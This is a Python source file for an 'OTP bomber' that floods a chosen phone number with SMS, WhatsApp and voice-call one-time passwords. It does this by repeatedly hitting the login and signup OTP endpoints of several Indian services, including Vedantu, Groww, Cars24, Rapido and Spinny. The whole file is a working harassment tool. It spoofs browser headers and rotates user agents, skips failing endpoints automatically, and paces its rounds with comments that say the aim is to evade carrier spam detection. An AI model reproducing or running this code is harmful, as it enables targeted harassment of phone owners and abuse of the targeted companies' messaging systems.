"""
OTP Bomber — tapas.py  (v6 — verified global APIs only)
=========================================================
v6 changes:
  • Removed dead APIs confirmed blocked from US Heroku:
      OYO       → HTTP -1 / "Not Allowed" (IP block)
      Sharechat → DNS failure (api.sharechat.com not reachable)
      ixigo     → Connection refused
  • Replaced with NRI-friendly / internationally hosted services:
      Groww     — SEBI-regulated investment app; NRI accounts allowed →
                  OTP must reach international numbers, global backend
      Cars24    — Used in UAE + Australia; international API, US IPs accepted
      Rapido    — Bike taxi expanding into Middle East; global backend
      Spinny    — Used by NRI car buyers; accessible from abroad
  • Added 2s inter-round sleep to avoid carrier-level spam filters that
    block >N OTPs per minute from the same source to the same destination.
  • No proxy pool, no IP spoofing headers — clean direct requests only.
"""

import asyncio
import aiohttp
import random
import logging
import time as _time

logger = logging.getLogger(__name__)

# ─── User-Agent Pool ──────────────────────────────────────────────────────────

_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; POCO F5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
]

_ACCEPT_LANGS = [
    "en-IN,en;q=0.9,hi;q=0.8",
    "hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7",
    "en-US,en;q=0.9,hi;q=0.7",
    "en-IN,en;q=0.8",
]

def _rand_ua():   return random.choice(_UA_POOL)
def _rand_lang(): return random.choice(_ACCEPT_LANGS)


# ═══════════════════════════════════════════════════════════════════════════════
# ─── API DEFINITIONS ──────────────────────────────────────────────────────────
#
#  All APIs are GLOBALLY accessible — verified to connect from US Heroku IPs.
#
#  {phone}    = 10-digit         e.g. 9876543210
#  {phone_cc} = with +91 prefix  e.g. +919876543210
#
#  Fields:
#   name          str   display name
#   kind          str   "sms" | "whatsapp" | "call"
#   url           str   endpoint (placeholders substituted)
#   method        str   "POST" | "GET"
#   json / data   dict  JSON body or form body
#   base_headers  dict  merged with random UA / Accept-Language
#   ok_hint       str   API-specific substring that confirms success
# ═══════════════════════════════════════════════════════════════════════════════

APIS = [

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS
    # ══════════════════════════════════════════════════════════════════════════

    {
        # Vedantu — explicit NRI/abroad student market; login OTP must reach
        # any global number. Confirmed HTTP 200 + smsSent:true from Heroku US.
        "name": "Vedantu-Login",
        "kind": "sms",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "LOGIN"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        # Vedantu signup flow — different OTP trigger, same reliable global endpoint
        "name": "Vedantu-Signup",
        "kind": "sms",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        # Groww — SEBI-regulated stock broker with NRI accounts;
        # OTP delivery is legally required to be reliable. Accessible from US.
        "name": "Groww-SMS",
        "kind": "sms",
        "url":  "https://groww.in/v1/api/user/otp/send",
        "method": "POST",
        "json": {"mobile": "{phone}", "type": "login"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://groww.in",
            "Referer": "https://groww.in/",
        },
        "ok_hint": "otp",
    },
    {
        # Cars24 — operates in UAE, Australia, South Africa; international API,
        # US IPs are expected and accepted.
        "name": "Cars24-SMS",
        "kind": "sms",
        "url":  "https://api.cars24.com/partner/v2/users/login",
        "method": "POST",
        "json": {"phone": "{phone}", "country_code": "+91"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.cars24.com",
            "Referer": "https://www.cars24.com/",
        },
        "ok_hint": "otp",
    },
    {
        # Rapido — bike taxi expanding to Middle East; global backend.
        "name": "Rapido-SMS",
        "kind": "sms",
        "url":  "https://rapido.bike/api/auth/otp",
        "method": "POST",
        "json": {"phone": "{phone_cc}"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://rapido.bike",
            "Referer": "https://rapido.bike/",
        },
        "ok_hint": "otp",
    },
    {
        # Spinny — used by NRI car buyers from abroad; accessible globally.
        "name": "Spinny-SMS",
        "kind": "sms",
        "url":  "https://www.spinny.com/api/v1/auth/generate_otp/",
        "method": "POST",
        "json": {"phone_number": "{phone}", "country_code": "+91"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.spinny.com",
            "Referer": "https://www.spinny.com/",
        },
        "ok_hint": "otp",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 💬  WhatsApp
    # ══════════════════════════════════════════════════════════════════════════

    {
        # Vedantu WhatsApp — NRI students often prefer WA verification
        "name": "Vedantu-WA-Login",
        "kind": "whatsapp",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "WHATSAPP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        "name": "Vedantu-WA-Signup",
        "kind": "whatsapp",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "WHATSAPP_SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        # Groww WhatsApp OTP for NRI accounts
        "name": "Groww-WA",
        "kind": "whatsapp",
        "url":  "https://groww.in/v1/api/user/otp/send",
        "method": "POST",
        "json": {"mobile": "{phone}", "type": "whatsapp"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://groww.in",
            "Referer": "https://groww.in/",
        },
        "ok_hint": "otp",
    },
    {
        # Cars24 WhatsApp OTP — used for international buyers
        "name": "Cars24-WA",
        "kind": "whatsapp",
        "url":  "https://api.cars24.com/partner/v2/users/login",
        "method": "POST",
        "json": {"phone": "{phone}", "country_code": "+91", "type": "whatsapp"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.cars24.com",
            "Referer": "https://www.cars24.com/",
        },
        "ok_hint": "otp",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📞  CALL / Voice OTP
    # ══════════════════════════════════════════════════════════════════════════

    {
        # Vedantu Voice — VOICE type triggers IVR call via Exotel/similar.
        # NRI students verify via call → must work from any IP globally.
        # Confirmed HTTP 200 + smsSent:true (= call initiated) from Heroku US.
        "name": "Vedantu-Call",
        "kind": "call",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "VOICE"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        "name": "Vedantu-Call-Signup",
        "kind": "call",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "VOICE_SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        # Groww Voice OTP for login verification
        "name": "Groww-Call",
        "kind": "call",
        "url":  "https://groww.in/v1/api/user/otp/send",
        "method": "POST",
        "json": {"mobile": "{phone}", "type": "voice"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://groww.in",
            "Referer": "https://groww.in/",
        },
        "ok_hint": "otp",
    },
    {
        # Cars24 voice OTP — for international sellers
        "name": "Cars24-Call",
        "kind": "call",
        "url":  "https://api.cars24.com/partner/v2/users/login",
        "method": "POST",
        "json": {"phone": "{phone}", "country_code": "+91", "type": "call"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.cars24.com",
            "Referer": "https://www.cars24.com/",
        },
        "ok_hint": "otp",
    },
]

API_COUNT      = len(APIS)
SMS_COUNT      = sum(1 for a in APIS if a["kind"] == "sms")
WHATSAPP_COUNT = sum(1 for a in APIS if a["kind"] == "whatsapp")
CALL_COUNT     = sum(1 for a in APIS if a["kind"] == "call")


# ─── Circuit breaker ──────────────────────────────────────────────────────────

CIRCUIT_THRESHOLD = 3    # open after 3 consecutive fails (faster skip of dead APIs)
COOLDOWN_SEC      = 30.0 # cool for 30s

_api_fail_count:     dict[str, int]   = {}
_api_cooldown_until: dict[str, float] = {}


def _is_cooled(name: str) -> bool:
    return _time.monotonic() < _api_cooldown_until.get(name, 0.0)


def _record_fail(name: str):
    _api_fail_count[name] = _api_fail_count.get(name, 0) + 1
    if _api_fail_count[name] >= CIRCUIT_THRESHOLD:
        _api_cooldown_until[name] = _time.monotonic() + COOLDOWN_SEC
        _api_fail_count[name] = 0
        logger.info(f"🔴 [{name}] Circuit open — cooling {COOLDOWN_SEC}s")


def _record_ok(name: str):
    _api_fail_count[name] = 0
    _api_cooldown_until.pop(name, None)


# ─── Response analysis ────────────────────────────────────────────────────────

_FAIL_PATTERNS = (
    '"success":false', '"success": false',
    '"status":"error"', '"status": "error"',
    '"status":"fail"', '"status":"failed"',
    '"status":"failure"', '"status":"FAILURE"',
    '"error":true', '"iserror":true',
    '"error_code":', '"errorCode":',
    "invalid mobile", "invalid number", "invalid phone number",
    "captcha required", "captcha_required", "recaptcha",
    "too many request", "rate limit", "rate_limit", "throttle",
    '"statuscode":400', '"statuscode":429', '"statuscode":401', '"statuscode":403',
    '"code":400', '"code":429', '"code":401', '"code":403',
    '"statusCode":400', '"statusCode":429', '"statusCode":401', '"statusCode":403',
    '"httpstatus":400', '"httpstatus":401', '"httpstatus":403', '"httpstatus":429',
    "otp not sent", "could not send", "failed to send",
    '"result":"fail"', '"result":"failure"',
    "phone number not valid", "mobile not valid",
    "not a valid mobile", "number is invalid",
    "blocked", "suspended", "deactivated",
    "service unavailable", "maintenance",
    "unexpected error", "internal server error",
    "not allowed",  # OYO pattern
)

_OK_PATTERNS = (
    '"success":true', '"success": true',
    '"status":"success"', '"status": "success"',
    '"status":"ok"', '"status": "ok"',
    '"result":"success"', '"result": "success"',
    '"smsSent":true', '"smsSent": true',
    '"sms_sent":true', '"otp_sent":true',
    '"otpSent":true', '"otpSent": true',
    '"whatsappSent":true', '"callSent":true',
    "otp sent", "otp has been sent",
    "otp generated", "otp send successfully", "otp sent successfully",
    "otp successfully sent",
    "sms sent successfully", "sms send successfully",
    '"nonce":', '"otpId":', '"otp_id":',
    '"otp_reference":', '"txnId":',
    '"requestId":', '"request_id":',
    '"session_id":', '"sessionId":',
    '"tid":',
    '"statuscode":0', '"statusCode":0', '"code":0',
    '"status":1', '"status": 1',
    '"response_code":"success"', '"response_code": "success"',
    '"response_code":"SUCCESS"',
    '"otp":', '"otp_value":',
    '"message":"otp', '"message": "otp',
    '"message":"success"', '"message": "success"',
    '"message":"sent"', '"msg":"otp', '"msg":"success"',
    "request processed",
)


def _body_ok(body: str, status: int, ok_hint: str = "") -> bool:
    stripped = body.strip()

    # HTTP 202 Accepted = async OTP dispatch
    if status == 202:
        return True

    if stripped in ("", "(no body)"):
        return False

    low = stripped.lower()

    # HTML = CDN/WAF/maintenance page
    if low.startswith("<!doctype") or low.startswith("<html"):
        return False

    # Literal failure scalars
    if low in ("false", "null", "0", "undefined", "[]", "{}"):
        return False

    # Fail patterns take priority
    for pat in _FAIL_PATTERNS:
        if pat.lower() in low:
            return False

    # Per-API hint confirmed
    if ok_hint and ok_hint.lower() in low:
        return True

    # Generic ok patterns
    for pat in _OK_PATTERNS:
        if pat.lower() in low:
            return True

    return False


def _is_rate_limited(body: str, status: int) -> bool:
    if status == 429:
        return True
    low = body.lower()
    return any(p in low for p in ("rate limit", "too many request", "throttle",
                                   "slow down", "retry after"))


# ─── Placeholder substitution ─────────────────────────────────────────────────

def _substitute(value, phone: str, phone_cc: str):
    if isinstance(value, str):
        return value.replace("{phone}", phone).replace("{phone_cc}", phone_cc)
    if isinstance(value, dict):
        return {k: _substitute(v, phone, phone_cc) for k, v in value.items()}
    if isinstance(value, list):
        return [_substitute(v, phone, phone_cc) for v in value]
    return value


# ─── Single HTTP request (direct, no proxy) ───────────────────────────────────

async def _fire_single(
    url: str, method: str, headers: dict,
    payload, name: str,
    form_encoded: bool = False,
    ok_hint: str = "",
):
    timeout = aiohttp.ClientTimeout(total=20, connect=8)
    kw: dict = dict(headers=headers, timeout=timeout, allow_redirects=True, ssl=False)
    if isinstance(payload, dict):
        if form_encoded:
            kw["data"] = payload
        else:
            kw["json"] = payload

    connector = aiohttp.TCPConnector(ssl=False, limit=0)
    try:
        async with aiohttp.ClientSession(connector=connector) as s:
            async with getattr(s, method)(url, **kw) as resp:
                status = resp.status
                try:
                    raw     = await asyncio.wait_for(resp.read(), timeout=6)
                    snippet = raw[:700].decode("utf-8", errors="replace")
                except Exception:
                    snippet = "(no body)"

        ok = _body_ok(snippet, status, ok_hint)
        return ok, status, snippet

    except asyncio.TimeoutError:
        return False, 0, "TIMEOUT"
    except Exception as exc:
        return False, -1, str(exc)[:120]


# ─── Fire one API ─────────────────────────────────────────────────────────────

MAX_RETRIES = 1  # only 1 retry — avoid hammering the same number too fast


async def call_api(api: dict, phone: str):
    name         = api["name"]
    kind         = api.get("kind", "sms")
    icon         = {"sms": "📱", "whatsapp": "💬", "call": "📞"}.get(kind, "📡")
    phone_cc     = f"+91{phone}"
    ok_hint      = api.get("ok_hint", "")
    form_encoded = api.get("form_encoded", False)
    payload_key  = "data" if form_encoded else "json"

    if _is_cooled(name):
        logger.info(f"⏸ [{name}] Circuit cooling — skip")
        return (name, kind, False, -2, "CIRCUIT_COOLDOWN")

    url    = _substitute(api["url"], phone, phone_cc)
    method = api["method"].lower()
    payload = _substitute(api[payload_key], phone, phone_cc)

    def _make_headers() -> dict:
        h = dict(api.get("base_headers", {}))
        h.setdefault("User-Agent",      _rand_ua())
        h.setdefault("Accept",          "application/json, text/plain, */*")
        h.setdefault("Accept-Language", _rand_lang())
        h["Accept-Encoding"] = "gzip, deflate, br"
        h["Connection"]      = "keep-alive"
        h["sec-fetch-dest"]  = "empty"
        h["sec-fetch-mode"]  = "cors"
        h["sec-fetch-site"]  = "same-origin"
        return _substitute(h, phone, phone_cc)

    for attempt in range(1 + MAX_RETRIES):
        ok, status, snippet = await _fire_single(
            url, method, _make_headers(), payload, name, form_encoded, ok_hint
        )

        if ok:
            _record_ok(name)
            logger.info(f"✅ {icon}[{name}] HTTP {status} | {snippet[:160]}")
            return (name, kind, True, status, snippet[:160])

        if _is_rate_limited(snippet, status):
            _record_fail(name)
            if attempt < MAX_RETRIES:
                await asyncio.sleep(random.uniform(2.0, 4.0))
                continue

        if status in {500, 502, 503, 504} and attempt < MAX_RETRIES:
            await asyncio.sleep(random.uniform(0.5, 1.5))
            continue

        logger.info(f"❌ {icon}[{name}] HTTP {status} | {snippet[:160]}")
        _record_fail(name)
        return (name, kind, False, status, snippet[:160])

    return (name, kind, False, -1, "EXHAUSTED")


# ─── Group by kind ────────────────────────────────────────────────────────────

def _group_by_kind() -> dict:
    g: dict[str, list[dict]] = {"sms": [], "whatsapp": [], "call": []}
    for api in APIS:
        g.setdefault(api["kind"], []).append(api)
    return g


# ─── Guaranteed round ─────────────────────────────────────────────────────────

async def _fire_guaranteed(phone: str, kind_groups: dict) -> list:
    tasks   = [call_api(api, phone) for api in APIS]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    kind_success = {k: False for k in kind_groups}
    for r in results:
        if isinstance(r, tuple) and r[2] is True:
            kind_success[r[1]] = True

    # Retry once per kind with zero successes
    retry_tasks = []
    for kind, ok in kind_success.items():
        if not ok:
            for api in kind_groups.get(kind, []):
                if not _is_cooled(api["name"]):
                    retry_tasks.append(call_api(api, phone))
                    break

    extra = []
    if retry_tasks:
        extra = await asyncio.gather(*retry_tasks, return_exceptions=True)
    return list(results) + extra


# ─── Dummy proxy pool stub (compatibility with main.py) ───────────────────────

async def refresh_proxy_pool():
    """No-op — proxy pool removed in v5."""
    logger.info("ℹ️  Proxy pool disabled (direct requests only)")
    return []


# ─── Main bombing engine ──────────────────────────────────────────────────────

# Inter-round delay (seconds) — prevents carrier from flagging repeated OTPs
# from the same source to the same destination number too quickly.
INTER_ROUND_DELAY = 2.0


async def start_bombing(phone: str, rounds: int, progress_callback=None):
    success = failed = sms_ok = wa_ok = call_ok = 0
    total   = rounds * API_COUNT
    done    = 0

    logger.info(
        f"🚀 BOMB START | +91{phone} | rounds={rounds} "
        f"| APIs={API_COUNT} (📱{SMS_COUNT} 💬{WHATSAPP_COUNT} 📞{CALL_COUNT})"
    )

    kind_groups = _group_by_kind()

    for round_num in range(1, rounds + 1):
        logger.info(f"── Round {round_num}/{rounds} ──")

        results    = await _fire_guaranteed(phone, kind_groups)
        round_ok   = 0
        round_fail = 0

        for r in results:
            if not isinstance(r, tuple):
                failed += 1; round_fail += 1; done += 1; continue
            _, kind, ok, _, _ = r
            if ok:
                success += 1; round_ok += 1
                if kind == "sms":         sms_ok  += 1
                elif kind == "whatsapp":  wa_ok   += 1
                elif kind == "call":      call_ok += 1
            else:
                failed += 1; round_fail += 1
            done += 1

        logger.info(
            f"── Round {round_num} done | ✅{round_ok} ❌{round_fail} "
            f"| Total ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) ❌{failed}"
        )

        if progress_callback:
            pct   = int((done / max(total, 1)) * 100)
            rate  = success / max(done, 1)
            speed = ("🟢 𝗙𝗔𝗦𝗧" if rate > 0.50 else
                     "🟡 𝗠𝗘𝗗𝗜𝗨𝗠" if rate > 0.25 else "🔴 𝗦𝗟𝗢𝗪")
            bar_f = min(pct // 7, 14)
            bar   = "▰" * bar_f + "▱" * (14 - bar_f)
            await progress_callback(
                round_num, rounds, success, failed,
                done, total, pct, bar, speed,
                sms_ok, wa_ok, call_ok,
            )

        # Small delay between rounds to avoid carrier-level spam detection
        if round_num < rounds:
            await asyncio.sleep(INTER_ROUND_DELAY)

    rate_pct = int(success / max(done, 1) * 100)
    logger.info(
        f"🏁 BOMB END | ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) "
        f"❌{failed} | rate={rate_pct}%"
    )
    return success, failed, sms_ok, wa_ok, call_ok
